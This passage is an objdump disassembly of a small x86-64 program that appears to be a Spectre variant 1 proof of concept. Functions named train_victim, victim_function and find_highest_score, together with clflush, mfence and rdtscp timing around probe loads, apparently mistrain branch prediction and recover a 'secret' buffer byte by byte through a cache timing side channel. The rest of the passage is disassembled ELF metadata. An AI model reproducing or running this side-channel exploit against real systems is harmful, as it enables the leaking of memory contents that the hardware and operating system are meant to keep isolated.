 91e:	89 ca                	mov    %ecx,%edx
 920:	85 d2                	test   %edx,%edx
 922:	75 06                	jne    92a <train_victim+0x126>
 924:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
 928:	eb 05                	jmp    92f <train_victim+0x12b>
 92a:	b8 00 00 00 00       	mov    $0x0,%eax
 92f:	48 89 c7             	mov    %rax,%rdi
 932:	e8 a3 fd ff ff       	callq  6da <victim_function>
 937:	83 6d ec 01          	subl   $0x1,-0x14(%rbp)
 93b:	83 7d ec 00          	cmpl   $0x0,-0x14(%rbp)
 93f:	0f 89 1d ff ff ff    	jns    862 <train_victim+0x5e>
 945:	90                   	nop
 946:	c9                   	leaveq 
 947:	c3                   	retq   

0000000000000948 <main>:
 948:	55                   	push   %rbp
 949:	48 89 e5             	mov    %rsp,%rbp
 94c:	53                   	push   %rbx
 94d:	48 83 ec 48          	sub    $0x48,%rsp
 951:	c7 45 b8 00 00 00 00 	movl   $0x0,-0x48(%rbp)
 958:	eb 24                	jmp    97e <main+0x36>
 95a:	8b 45 b8             	mov    -0x48(%rbp),%eax
 95d:	99                   	cltd   
 95e:	c1 ea 18             	shr    $0x18,%edx
 961:	01 d0                	add    %edx,%eax
 963:	0f b6 c0             	movzbl %al,%eax
 966:	29 d0                	sub    %edx,%eax
 968:	89 c1                	mov    %eax,%ecx
 96a:	8b 45 b8             	mov    -0x48(%rbp),%eax
 96d:	48 63 d0             	movslq %eax,%rdx
 970:	48 8d 05 c9 17 20 00 	lea    0x2017c9(%rip),%rax        # 202140 <array>
 977:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
 97a:	83 45 b8 01          	addl   $0x1,-0x48(%rbp)
 97e:	81 7d b8 ff ff 0f 00 	cmpl   $0xfffff,-0x48(%rbp)
 985:	7e d3                	jle    95a <main+0x12>
 987:	c7 45 bc 00 00 00 00 	movl   $0x0,-0x44(%rbp)
 98e:	eb 44                	jmp    9d4 <main+0x8c>
 990:	c7 45 c0 00 00 00 00 	movl   $0x0,-0x40(%rbp)
 997:	eb 2e                	jmp    9c7 <main+0x7f>
 999:	8b 45 bc             	mov    -0x44(%rbp),%eax
 99c:	99                   	cltd   
 99d:	c1 ea 18             	shr    $0x18,%edx
 9a0:	01 d0                	add    %edx,%eax
 9a2:	0f b6 c0             	movzbl %al,%eax
 9a5:	29 d0                	sub    %edx,%eax
 9a7:	89 c1                	mov    %eax,%ecx
 9a9:	8b 45 bc             	mov    -0x44(%rbp),%eax
 9ac:	c1 e0 0c             	shl    $0xc,%eax
 9af:	89 c2                	mov    %eax,%edx
 9b1:	8b 45 c0             	mov    -0x40(%rbp),%eax
 9b4:	01 d0                	add    %edx,%eax
 9b6:	48 63 d0             	movslq %eax,%rdx
 9b9:	48 8d 05 80 19 30 00 	lea    0x301980(%rip),%rax        # 302340 <bigNumberBuffer>
 9c0:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
 9c3:	83 45 c0 01          	addl   $0x1,-0x40(%rbp)
 9c7:	81 7d c0 ff 0f 00 00 	cmpl   $0xfff,-0x40(%rbp)
 9ce:	7e c9                	jle    999 <main+0x51>
 9d0:	83 45 bc 01          	addl   $0x1,-0x44(%rbp)
 9d4:	81 7d bc ff 00 00 00 	cmpl   $0xff,-0x44(%rbp)
 9db:	7e b3                	jle    990 <main+0x48>
 9dd:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%rbp)
 9e4:	e9 5d 01 00 00       	jmpq   b46 <main+0x1fe>
 9e9:	c7 45 c8 00 00 00 00 	movl   $0x0,-0x38(%rbp)
 9f0:	eb 1a                	jmp    a0c <main+0xc4>
 9f2:	8b 45 c8             	mov    -0x38(%rbp),%eax
 9f5:	c1 e0 0c             	shl    $0xc,%eax
 9f8:	48 63 d0             	movslq %eax,%rdx
 9fb:	48 8d 05 3e 17 20 00 	lea    0x20173e(%rip),%rax        # 202140 <array>
 a02:	48 01 d0             	add    %rdx,%rax
 a05:	0f ae 38             	clflush (%rax)
 a08:	83 45 c8 01          	addl   $0x1,-0x38(%rbp)
 a0c:	81 7d c8 ff 00 00 00 	cmpl   $0xff,-0x38(%rbp)
 a13:	7e dd                	jle    9f2 <main+0xaa>
 a15:	0f ae f0             	mfence 
 a18:	bf 00 04 00 00       	mov    $0x400,%edi
 a1d:	e8 8e fb ff ff       	callq  5b0 <malloc@plt>
 a22:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
 a26:	c7 45 cc 00 00 00 00 	movl   $0x0,-0x34(%rbp)
 a2d:	eb 1e                	jmp    a4d <main+0x105>
 a2f:	8b 45 cc             	mov    -0x34(%rbp),%eax
 a32:	48 98                	cltq   
 a34:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 a3b:	00 
 a3c:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
 a40:	48 01 d0             	add    %rdx,%rax
 a43:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
 a49:	83 45 cc 01          	addl   $0x1,-0x34(%rbp)
 a4d:	81 7d cc ff 00 00 00 	cmpl   $0xff,-0x34(%rbp)
 a54:	7e d9                	jle    a2f <main+0xe7>
 a56:	8b 45 c4             	mov    -0x3c(%rbp),%eax
 a59:	48 98                	cltq   
 a5b:	48 8d 0d 7e 16 20 00 	lea    0x20167e(%rip),%rcx        # 2020e0 <secret>
 a62:	48 8d 15 d7 15 20 00 	lea    0x2015d7(%rip),%rdx        # 202040 <buffer>
 a69:	48 29 d1             	sub    %rdx,%rcx
 a6c:	48 89 ca             	mov    %rcx,%rdx
 a6f:	48 01 d0             	add    %rdx,%rax
 a72:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
 a76:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%rbp)
 a7d:	e9 9e 00 00 00       	jmpq   b20 <main+0x1d8>
 a82:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
 a86:	8b 45 d0             	mov    -0x30(%rbp),%eax
 a89:	48 89 d6             	mov    %rdx,%rsi
 a8c:	89 c7                	mov    %eax,%edi
 a8e:	e8 71 fd ff ff       	callq  804 <train_victim>
 a93:	c7 45 b4 00 00 00 00 	movl   $0x0,-0x4c(%rbp)
 a9a:	eb 77                	jmp    b13 <main+0x1cb>
 a9c:	8b 45 b4             	mov    -0x4c(%rbp),%eax
 a9f:	69 c0 a7 00 00 00    	imul   $0xa7,%eax,%eax
 aa5:	83 c0 0d             	add    $0xd,%eax
 aa8:	25 ff 00 00 00       	and    $0xff,%eax
 aad:	89 45 d4             	mov    %eax,-0x2c(%rbp)
 ab0:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
 ab7:	00 
 ab8:	8b 45 d4             	mov    -0x2c(%rbp),%eax
 abb:	c1 e0 0c             	shl    $0xc,%eax
 abe:	48 63 d0             	movslq %eax,%rdx
 ac1:	48 8d 05 78 16 20 00 	lea    0x201678(%rip),%rax        # 202140 <array>
 ac8:	48 01 d0             	add    %rdx,%rax
 acb:	48 89 c3             	mov    %rax,%rbx
 ace:	0f ae f0             	mfence 
 ad1:	0f 01 f9             	rdtscp 
 ad4:	49 89 c2             	mov    %rax,%r10
 ad7:	48 8b 0b             	mov    (%rbx),%rcx
 ada:	0f 01 f9             	rdtscp 
 add:	4c 29 d0             	sub    %r10,%rax
 ae0:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
 ae4:	48 81 7d e8 3f 01 00 	cmpq   $0x13f,-0x18(%rbp)
 aeb:	00 
 aec:	77 21                	ja     b0f <main+0x1c7>
 aee:	83 7d d4 00          	cmpl   $0x0,-0x2c(%rbp)
 af2:	74 1b                	je     b0f <main+0x1c7>
 af4:	8b 45 d4             	mov    -0x2c(%rbp),%eax
 af7:	48 98                	cltq   
 af9:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 b00:	00 
 b01:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
 b05:	48 01 d0             	add    %rdx,%rax
 b08:	8b 10                	mov    (%rax),%edx
 b0a:	83 c2 01             	add    $0x1,%edx
 b0d:	89 10                	mov    %edx,(%rax)
 b0f:	83 45 b4 01          	addl   $0x1,-0x4c(%rbp)
 b13:	81 7d b4 ff 00 00 00 	cmpl   $0xff,-0x4c(%rbp)
 b1a:	7e 80                	jle    a9c <main+0x154>
 b1c:	83 45 d0 01          	addl   $0x1,-0x30(%rbp)
 b20:	83 7d d0 27          	cmpl   $0x27,-0x30(%rbp)
 b24:	0f 8e 58 ff ff ff    	jle    a82 <main+0x13a>
 b2a:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
 b2e:	48 89 c7             	mov    %rax,%rdi
 b31:	e8 45 fc ff ff       	callq  77b <find_highest_score>
 b36:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
 b3a:	48 89 c7             	mov    %rax,%rdi
 b3d:	e8 4e fa ff ff       	callq  590 <free@plt>
 b42:	83 45 c4 01          	addl   $0x1,-0x3c(%rbp)
 b46:	83 7d c4 02          	cmpl   $0x2,-0x3c(%rbp)
 b4a:	0f 8e 99 fe ff ff    	jle    9e9 <main+0xa1>
 b50:	b8 00 00 00 00       	mov    $0x0,%eax
 b55:	48 83 c4 48          	add    $0x48,%rsp
 b59:	5b                   	pop    %rbx
 b5a:	5d                   	pop    %rbp
 b5b:	c3                   	retq   
 b5c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000000b60 <__libc_csu_init>:
 b60:	41 57                	push   %r15
 b62:	41 56                	push   %r14
 b64:	49 89 d7             	mov    %rdx,%r15
 b67:	41 55                	push   %r13
 b69:	41 54                	push   %r12
 b6b:	4c 8d 25 36 12 20 00 	lea    0x201236(%rip),%r12        # 201da8 <__frame_dummy_init_array_entry>
 b72:	55                   	push   %rbp
 b73:	48 8d 2d 36 12 20 00 	lea    0x201236(%rip),%rbp        # 201db0 <__init_array_end>
 b7a:	53                   	push   %rbx
 b7b:	41 89 fd             	mov    %edi,%r13d
 b7e:	49 89 f6             	mov    %rsi,%r14
 b81:	4c 29 e5             	sub    %r12,%rbp
 b84:	48 83 ec 08          	sub    $0x8,%rsp
 b88:	48 c1 fd 03          	sar    $0x3,%rbp
 b8c:	e8 cf f9 ff ff       	callq  560 <_init>
 b91:	48 85 ed             	test   %rbp,%rbp
 b94:	74 20                	je     bb6 <__libc_csu_init+0x56>
 b96:	31 db                	xor    %ebx,%ebx
 b98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 b9f:	00 
 ba0:	4c 89 fa             	mov    %r15,%rdx
 ba3:	4c 89 f6             	mov    %r14,%rsi
 ba6:	44 89 ef             	mov    %r13d,%edi
 ba9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
 bad:	48 83 c3 01          	add    $0x1,%rbx
 bb1:	48 39 dd             	cmp    %rbx,%rbp
 bb4:	75 ea                	jne    ba0 <__libc_csu_init+0x40>
 bb6:	48 83 c4 08          	add    $0x8,%rsp
 bba:	5b                   	pop    %rbx
 bbb:	5d                   	pop    %rbp
 bbc:	41 5c                	pop    %r12
 bbe:	41 5d                	pop    %r13
 bc0:	41 5e                	pop    %r14
 bc2:	41 5f                	pop    %r15
 bc4:	c3                   	retq   
 bc5:	90                   	nop
 bc6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 bcd:	00 00 00 

0000000000000bd0 <__libc_csu_fini>:
 bd0:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000000bd4 <_fini>:
 bd4:	48 83 ec 08          	sub    $0x8,%rsp
 bd8:	48 83 c4 08          	add    $0x8,%rsp
 bdc:	c3                   	retq   

Disassembly of section .rodata:

0000000000000be0 <_IO_stdin_used>:
 be0:	01 00                	add    %eax,(%rax)
 be2:	02 00                	add    (%rax),%al
 be4:	00 00                	add    %al,(%rax)
 be6:	00 00                	add    %al,(%rax)
 be8:	4c                   	rex.WR
 be9:	65 74 74             	gs je  c60 <__GNU_EH_FRAME_HDR+0x54>
 bec:	65 72 3a             	gs jb  c29 <__GNU_EH_FRAME_HDR+0x1d>
 bef:	20 25 63 09 20 49    	and    %ah,0x49200963(%rip)        # 49201558 <_end+0x48dff118>
 bf5:	6e                   	outsb  %ds:(%rsi),(%dx)
 bf6:	64 65 78 3a          	fs gs js c34 <__GNU_EH_FRAME_HDR+0x28>
 bfa:	20 25 64 09 20 48    	and    %ah,0x48200964(%rip)        # 48201564 <_end+0x47dff124>
 c00:	69 74 73 3a 25 64 20 	imul   $0xa206425,0x3a(%rbx,%rsi,2),%esi
 c07:	0a 
	...

Disassembly of section .eh_frame_hdr:

0000000000000c0c <__GNU_EH_FRAME_HDR>:
 c0c:	01 1b                	add    %ebx,(%rbx)
 c0e:	03 3b                	add    (%rbx),%edi
 c10:	50                   	push   %rax
 c11:	00 00                	add    %al,(%rax)
 c13:	00 09                	add    %cl,(%rcx)
 c15:	00 00                	add    %al,(%rax)
 c17:	00 74 f9 ff          	add    %dh,-0x1(%rcx,%rdi,8)
 c1b:	ff 9c 00 00 00 b4 f9 	lcall  *-0x64c0000(%rax,%rax,1)
 c22:	ff                   	(bad)  
 c23:	ff c4                	inc    %esp
 c25:	00 00                	add    %al,(%rax)
 c27:	00 c4                	add    %al,%ah
 c29:	f9                   	stc    
 c2a:	ff                   	(bad)  
 c2b:	ff 6c 00 00          	ljmp   *0x0(%rax,%rax,1)
 c2f:	00 ce                	add    %cl,%dh
 c31:	fa                   	cli    
 c32:	ff                   	(bad)  
 c33:	ff                   	(bad)  
 c34:	dc 00                	faddl  (%rax)
 c36:	00 00                	add    %al,(%rax)
 c38:	6f                   	outsl  %ds:(%rsi),(%dx)
 c39:	fb                   	sti    
 c3a:	ff                   	(bad)  
 c3b:	ff                   	(bad)  
 c3c:	fc                   	cld    
 c3d:	00 00                	add    %al,(%rax)
 c3f:	00 f8                	add    %bh,%al
 c41:	fb                   	sti    
 c42:	ff                   	(bad)  
 c43:	ff 1c 01             	lcall  *(%rcx,%rax,1)
 c46:	00 00                	add    %al,(%rax)
 c48:	3c fd                	cmp    $0xfd,%al
 c4a:	ff                   	(bad)  
 c4b:	ff                   	(bad)  
 c4c:	3c 01                	cmp    $0x1,%al
 c4e:	00 00                	add    %al,(%rax)
 c50:	54                   	push   %rsp
 c51:	ff                   	(bad)  
 c52:	ff                   	(bad)  
 c53:	ff 64 01 00          	jmpq   *0x0(%rcx,%rax,1)
 c57:	00 c4                	add    %al,%ah
 c59:	ff                   	(bad)  
 c5a:	ff                   	(bad)  
 c5b:	ff                   	.byte 0xff
 c5c:	ac                   	lods   %ds:(%rsi),%al
 c5d:	01 00                	add    %eax,(%rax)
	...

Disassembly of section .eh_frame:

0000000000000c60 <__FRAME_END__-0x16c>:
 c60:	14 00                	adc    $0x0,%al
 c62:	00 00                	add    %al,(%rax)
 c64:	00 00                	add    %al,(%rax)
 c66:	00 00                	add    %al,(%rax)
 c68:	01 7a 52             	add    %edi,0x52(%rdx)
 c6b:	00 01                	add    %al,(%rcx)
 c6d:	78 10                	js     c7f <__GNU_EH_FRAME_HDR+0x73>
 c6f:	01 1b                	add    %ebx,(%rbx)
 c71:	0c 07                	or     $0x7,%al
 c73:	08 90 01 07 10 14    	or     %dl,0x14100701(%rax)
 c79:	00 00                	add    %al,(%rax)
 c7b:	00 1c 00             	add    %bl,(%rax,%rax,1)
 c7e:	00 00                	add    %al,(%rax)
 c80:	50                   	push   %rax
 c81:	f9                   	stc    
 c82:	ff                   	(bad)  
 c83:	ff 2b                	ljmp   *(%rbx)
	...
 c8d:	00 00                	add    %al,(%rax)
 c8f:	00 14 00             	add    %dl,(%rax,%rax,1)
 c92:	00 00                	add    %al,(%rax)
 c94:	00 00                	add    %al,(%rax)
 c96:	00 00                	add    %al,(%rax)
 c98:	01 7a 52             	add    %edi,0x52(%rdx)
 c9b:	00 01                	add    %al,(%rcx)
 c9d:	78 10                	js     caf <__GNU_EH_FRAME_HDR+0xa3>
 c9f:	01 1b                	add    %ebx,(%rbx)
 ca1:	0c 07                	or     $0x7,%al
 ca3:	08 90 01 00 00 24    	or     %dl,0x24000001(%rax)
 ca9:	00 00                	add    %al,(%rax)
 cab:	00 1c 00             	add    %bl,(%rax,%rax,1)
 cae:	00 00                	add    %al,(%rax)
 cb0:	d0 f8                	sar    %al
 cb2:	ff                   	(bad)  
 cb3:	ff 40 00             	incl   0x0(%rax)
 cb6:	00 00                	add    %al,(%rax)
 cb8:	00 0e                	add    %cl,(%rsi)
 cba:	10 46 0e             	adc    %al,0xe(%rsi)
 cbd:	18 4a 0f             	sbb    %cl,0xf(%rdx)
 cc0:	0b 77 08             	or     0x8(%rdi),%esi
 cc3:	80 00 3f             	addb   $0x3f,(%rax)
 cc6:	1a 3b                	sbb    (%rbx),%bh
 cc8:	2a 33                	sub    (%rbx),%dh
 cca:	24 22                	and    $0x22,%al
 ccc:	00 00                	add    %al,(%rax)
 cce:	00 00                	add    %al,(%rax)
 cd0:	14 00                	adc    $0x0,%al
 cd2:	00 00                	add    %al,(%rax)
 cd4:	44 00 00             	add    %r8b,(%rax)
 cd7:	00 e8                	add    %ch,%al
 cd9:	f8                   	clc    
 cda:	ff                   	(bad)  
 cdb:	ff 08                	decl   (%rax)
	...
 ce5:	00 00                	add    %al,(%rax)
 ce7:	00 1c 00             	add    %bl,(%rax,%rax,1)
 cea:	00 00                	add    %al,(%rax)
 cec:	5c                   	pop    %rsp
 ced:	00 00                	add    %al,(%rax)
 cef:	00 ea                	add    %ch,%dl
 cf1:	f9                   	stc    
 cf2:	ff                   	(bad)  
 cf3:	ff a1 00 00 00 00    	jmpq   *0x0(%rcx)
 cf9:	41 0e                	rex.B (bad) 
 cfb:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 d01:	02 9c 0c 07 08 00 00 	add    0x807(%rsp,%rcx,1),%bl
 d08:	1c 00                	sbb    $0x0,%al
 d0a:	00 00                	add    %al,(%rax)
 d0c:	7c 00                	jl     d0e <__GNU_EH_FRAME_HDR+0x102>
 d0e:	00 00                	add    %al,(%rax)
 d10:	6b fa ff             	imul   $0xffffffff,%edx,%edi
 d13:	ff 89 00 00 00 00    	decl   0x0(%rcx)
 d19:	41 0e                	rex.B (bad) 
 d1b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 d21:	02 84 0c 07 08 00 00 	add    0x807(%rsp,%rcx,1),%al
 d28:	1c 00                	sbb    $0x0,%al
 d2a:	00 00                	add    %al,(%rax)
 d2c:	9c                   	pushfq 
 d2d:	00 00                	add    %al,(%rax)
 d2f:	00 d4                	add    %dl,%ah
 d31:	fa                   	cli    
 d32:	ff                   	(bad)  
 d33:	ff 44 01 00          	incl   0x0(%rcx,%rax,1)
 d37:	00 00                	add    %al,(%rax)
 d39:	41 0e                	rex.B (bad) 
 d3b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 d41:	03 3f                	add    (%rdi),%edi
 d43:	01 0c 07             	add    %ecx,(%rdi,%rax,1)
 d46:	08 00                	or     %al,(%rax)
 d48:	24 00                	and    $0x0,%al
 d4a:	00 00                	add    %al,(%rax)
 d4c:	bc 00 00 00 f8       	mov    $0xf8000000,%esp
 d51:	fb                   	sti    
 d52:	ff                   	(bad)  
 d53:	ff 14 02             	callq  *(%rdx,%rax,1)
 d56:	00 00                	add    %al,(%rax)
 d58:	00 41 0e             	add    %al,0xe(%rcx)
 d5b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 d61:	45 83 03 03          	rex.RB addl $0x3,(%r11)
 d65:	0a 02                	or     (%rdx),%al
 d67:	0c 07                	or     $0x7,%al
 d69:	08 00                	or     %al,(%rax)
 d6b:	00 00                	add    %al,(%rax)
 d6d:	00 00                	add    %al,(%rax)
 d6f:	00 44 00 00          	add    %al,0x0(%rax,%rax,1)
 d73:	00 e4                	add    %ah,%ah
 d75:	00 00                	add    %al,(%rax)
 d77:	00 e8                	add    %ch,%al
 d79:	fd                   	std    
 d7a:	ff                   	(bad)  
 d7b:	ff 65 00             	jmpq   *0x0(%rbp)
 d7e:	00 00                	add    %al,(%rax)
 d80:	00 42 0e             	add    %al,0xe(%rdx)
 d83:	10 8f 02 42 0e 18    	adc    %cl,0x180e4202(%rdi)
 d89:	8e 03                	mov    (%rbx),%es
 d8b:	45 0e                	rex.RB (bad) 
 d8d:	20 8d 04 42 0e 28    	and    %cl,0x280e4204(%rbp)
 d93:	8c 05 48 0e 30 86    	mov    %es,-0x79cff1b8(%rip)        # ffffffff86301be1 <_end+0xffffffff85eff7a1>
 d99:	06                   	(bad)  
 d9a:	48 0e                	rex.W (bad) 
 d9c:	38 83 07 4d 0e 40    	cmp    %al,0x400e4d07(%rbx)
 da2:	72 0e                	jb     db2 <__GNU_EH_FRAME_HDR+0x1a6>
 da4:	38 41 0e             	cmp    %al,0xe(%rcx)
 da7:	30 41 0e             	xor    %al,0xe(%rcx)
 daa:	28 42 0e             	sub    %al,0xe(%rdx)
 dad:	20 42 0e             	and    %al,0xe(%rdx)
 db0:	18 42 0e             	sbb    %al,0xe(%rdx)
 db3:	10 42 0e             	adc    %al,0xe(%rdx)
 db6:	08 00                	or     %al,(%rax)
 db8:	10 00                	adc    %al,(%rax)
 dba:	00 00                	add    %al,(%rax)
 dbc:	2c 01                	sub    $0x1,%al
 dbe:	00 00                	add    %al,(%rax)
 dc0:	10 fe                	adc    %bh,%dh
 dc2:	ff                   	(bad)  
 dc3:	ff 02                	incl   (%rdx)
 dc5:	00 00                	add    %al,(%rax)
 dc7:	00 00                	add    %al,(%rax)
 dc9:	00 00                	add    %al,(%rax)
	...

0000000000000dcc <__FRAME_END__>:
 dcc:	00 00                	add    %al,(%rax)
	...

Disassembly of section .init_array:

0000000000201da8 <__frame_dummy_init_array_entry>:
  201da8:	d0 06                	rolb   (%rsi)
  201daa:	00 00                	add    %al,(%rax)
  201dac:	00 00                	add    %al,(%rax)
	...

Disassembly of section .fini_array:

0000000000201db0 <__do_global_dtors_aux_fini_array_entry>:
  201db0:	90                   	nop
  201db1:	06                   	(bad)  
  201db2:	00 00                	add    %al,(%rax)
  201db4:	00 00                	add    %al,(%rax)
	...

Disassembly of section .dynamic:

0000000000201db8 <_DYNAMIC>:
  201db8:	01 00                	add    %eax,(%rax)
  201dba:	00 00                	add    %al,(%rax)
  201dbc:	00 00                	add    %al,(%rax)
  201dbe:	00 00                	add    %al,(%rax)
  201dc0:	01 00                	add    %eax,(%rax)
  201dc2:	00 00                	add    %al,(%rax)
  201dc4:	00 00                	add    %al,(%rax)
  201dc6:	00 00                	add    %al,(%rax)
  201dc8:	0c 00                	or     $0x0,%al
  201dca:	00 00                	add    %al,(%rax)
  201dcc:	00 00                	add    %al,(%rax)
  201dce:	00 00                	add    %al,(%rax)
  201dd0:	60                   	(bad)  
  201dd1:	05 00 00 00 00       	add    $0x0,%eax
  201dd6:	00 00                	add    %al,(%rax)
  201dd8:	0d 00 00 00 00       	or     $0x0,%eax
  201ddd:	00 00                	add    %al,(%rax)
  201ddf:	00 d4                	add    %dl,%ah
  201de1:	0b 00                	or     (%rax),%eax
  201de3:	00 00                	add    %al,(%rax)
  201de5:	00 00                	add    %al,(%rax)
  201de7:	00 19                	add    %bl,(%rcx)
  201de9:	00 00                	add    %al,(%rax)
  201deb:	00 00                	add    %al,(%rax)
  201ded:	00 00                	add    %al,(%rax)
  201def:	00 a8 1d 20 00 00    	add    %ch,0x201d(%rax)
  201df5:	00 00                	add    %al,(%rax)
  201df7:	00 1b                	add    %bl,(%rbx)
  201df9:	00 00                	add    %al,(%rax)
  201dfb:	00 00                	add    %al,(%rax)
  201dfd:	00 00                	add    %al,(%rax)
  201dff:	00 08                	add    %cl,(%rax)
  201e01:	00 00                	add    %al,(%rax)
  201e03:	00 00                	add    %al,(%rax)
  201e05:	00 00                	add    %al,(%rax)
  201e07:	00 1a                	add    %bl,(%rdx)
  201e09:	00 00                	add    %al,(%rax)
  201e0b:	00 00                	add    %al,(%rax)
  201e0d:	00 00                	add    %al,(%rax)
  201e0f:	00 b0 1d 20 00 00    	add    %dh,0x201d(%rax)
  201e15:	00 00                	add    %al,(%rax)
  201e17:	00 1c 00             	add    %bl,(%rax,%rax,1)
  201e1a:	00 00                	add    %al,(%rax)
  201e1c:	00 00                	add    %al,(%rax)
  201e1e:	00 00                	add    %al,(%rax)
  201e20:	08 00                	or     %al,(%rax)
  201e22:	00 00                	add    %al,(%rax)
  201e24:	00 00                	add    %al,(%rax)
  201e26:	00 00                	add    %al,(%rax)
  201e28:	f5                   	cmc    
  201e29:	fe                   	(bad)  
  201e2a:	ff 6f 00             	ljmp   *0x0(%rdi)
  201e2d:	00 00                	add    %al,(%rax)
  201e2f:	00 98 02 00 00 00    	add    %bl,0x2(%rax)
  201e35:	00 00                	add    %al,(%rax)
  201e37:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 201e3d <_DYNAMIC+0x85>
  201e3d:	00 00                	add    %al,(%rax)
  201e3f:	00 90 03 00 00 00    	add    %dl,0x3(%rax)
  201e45:	00 00                	add    %al,(%rax)
  201e47:	00 06                	add    %al,(%rsi)
  201e49:	00 00                	add    %al,(%rax)
  201e4b:	00 00                	add    %al,(%rax)
  201e4d:	00 00                	add    %al,(%rax)
  201e4f:	00 b8 02 00 00 00    	add    %bh,0x2(%rax)
  201e55:	00 00                	add    %al,(%rax)
  201e57:	00 0a                	add    %cl,(%rdx)
  201e59:	00 00                	add    %al,(%rax)
  201e5b:	00 00                	add    %al,(%rax)
  201e5d:	00 00                	add    %al,(%rax)
  201e5f:	00 90 00 00 00 00    	add    %dl,0x0(%rax)
  201e65:	00 00                	add    %al,(%rax)
  201e67:	00 0b                	add    %cl,(%rbx)
  201e69:	00 00                	add    %al,(%rax)
  201e6b:	00 00                	add    %al,(%rax)
  201e6d:	00 00                	add    %al,(%rax)
  201e6f:	00 18                	add    %bl,(%rax)
  201e71:	00 00                	add    %al,(%rax)
  201e73:	00 00                	add    %al,(%rax)
  201e75:	00 00                	add    %al,(%rax)
  201e77:	00 15 00 00 00 00    	add    %dl,0x0(%rip)        # 201e7d <_DYNAMIC+0xc5>
	...
  201e85:	00 00                	add    %al,(%rax)
  201e87:	00 03                	add    %al,(%rbx)
  201e89:	00 00                	add    %al,(%rax)
  201e8b:	00 00                	add    %al,(%rax)
  201e8d:	00 00                	add    %al,(%rax)
  201e8f:	00 a8 1f 20 00 00    	add    %ch,0x201f(%rax)
  201e95:	00 00                	add    %al,(%rax)
  201e97:	00 02                	add    %al,(%rdx)
  201e99:	00 00                	add    %al,(%rax)
  201e9b:	00 00                	add    %al,(%rax)
  201e9d:	00 00                	add    %al,(%rax)
  201e9f:	00 48 00             	add    %cl,0x0(%rax)
  201ea2:	00 00                	add    %al,(%rax)
  201ea4:	00 00                	add    %al,(%rax)
  201ea6:	00 00                	add    %al,(%rax)
  201ea8:	14 00                	adc    $0x0,%al
  201eaa:	00 00                	add    %al,(%rax)
  201eac:	00 00                	add    %al,(%rax)
  201eae:	00 00                	add    %al,(%rax)
  201eb0:	07                   	(bad)  
  201eb1:	00 00                	add    %al,(%rax)
  201eb3:	00 00                	add    %al,(%rax)
  201eb5:	00 00                	add    %al,(%rax)
  201eb7:	00 17                	add    %dl,(%rdi)
  201eb9:	00 00                	add    %al,(%rax)
  201ebb:	00 00                	add    %al,(%rax)
  201ebd:	00 00                	add    %al,(%rax)
  201ebf:	00 18                	add    %bl,(%rax)
  201ec1:	05 00 00 00 00       	add    $0x0,%eax
  201ec6:	00 00                	add    %al,(%rax)
  201ec8:	07                   	(bad)  
  201ec9:	00 00                	add    %al,(%rax)
  201ecb:	00 00                	add    %al,(%rax)
  201ecd:	00 00                	add    %al,(%rax)
  201ecf:	00 58 04             	add    %bl,0x4(%rax)
  201ed2:	00 00                	add    %al,(%rax)
  201ed4:	00 00                	add    %al,(%rax)
  201ed6:	00 00                	add    %al,(%rax)
  201ed8:	08 00                	or     %al,(%rax)
  201eda:	00 00                	add    %al,(%rax)
  201edc:	00 00                	add    %al,(%rax)
  201ede:	00 00                	add    %al,(%rax)
  201ee0:	c0 00 00             	rolb   $0x0,(%rax)
  201ee3:	00 00                	add    %al,(%rax)
  201ee5:	00 00                	add    %al,(%rax)
  201ee7:	00 09                	add    %cl,(%rcx)
  201ee9:	00 00                	add    %al,(%rax)
  201eeb:	00 00                	add    %al,(%rax)
  201eed:	00 00                	add    %al,(%rax)
  201eef:	00 18                	add    %bl,(%rax)
  201ef1:	00 00                	add    %al,(%rax)
  201ef3:	00 00                	add    %al,(%rax)
  201ef5:	00 00                	add    %al,(%rax)
  201ef7:	00 1e                	add    %bl,(%rsi)
  201ef9:	00 00                	add    %al,(%rax)
  201efb:	00 00                	add    %al,(%rax)
  201efd:	00 00                	add    %al,(%rax)
  201eff:	00 08                	add    %cl,(%rax)
  201f01:	00 00                	add    %al,(%rax)
  201f03:	00 00                	add    %al,(%rax)
  201f05:	00 00                	add    %al,(%rax)
  201f07:	00 fb                	add    %bh,%bl
  201f09:	ff                   	(bad)  
  201f0a:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f0d:	00 00                	add    %al,(%rax)
  201f0f:	00 01                	add    %al,(%rcx)
  201f11:	00 00                	add    %al,(%rax)
  201f13:	08 00                	or     %al,(%rax)
  201f15:	00 00                	add    %al,(%rax)
  201f17:	00 fe                	add    %bh,%dh
  201f19:	ff                   	(bad)  
  201f1a:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f1d:	00 00                	add    %al,(%rax)
  201f1f:	00 38                	add    %bh,(%rax)
  201f21:	04 00                	add    $0x0,%al
  201f23:	00 00                	add    %al,(%rax)
  201f25:	00 00                	add    %al,(%rax)
  201f27:	00 ff                	add    %bh,%bh
  201f29:	ff                   	(bad)  
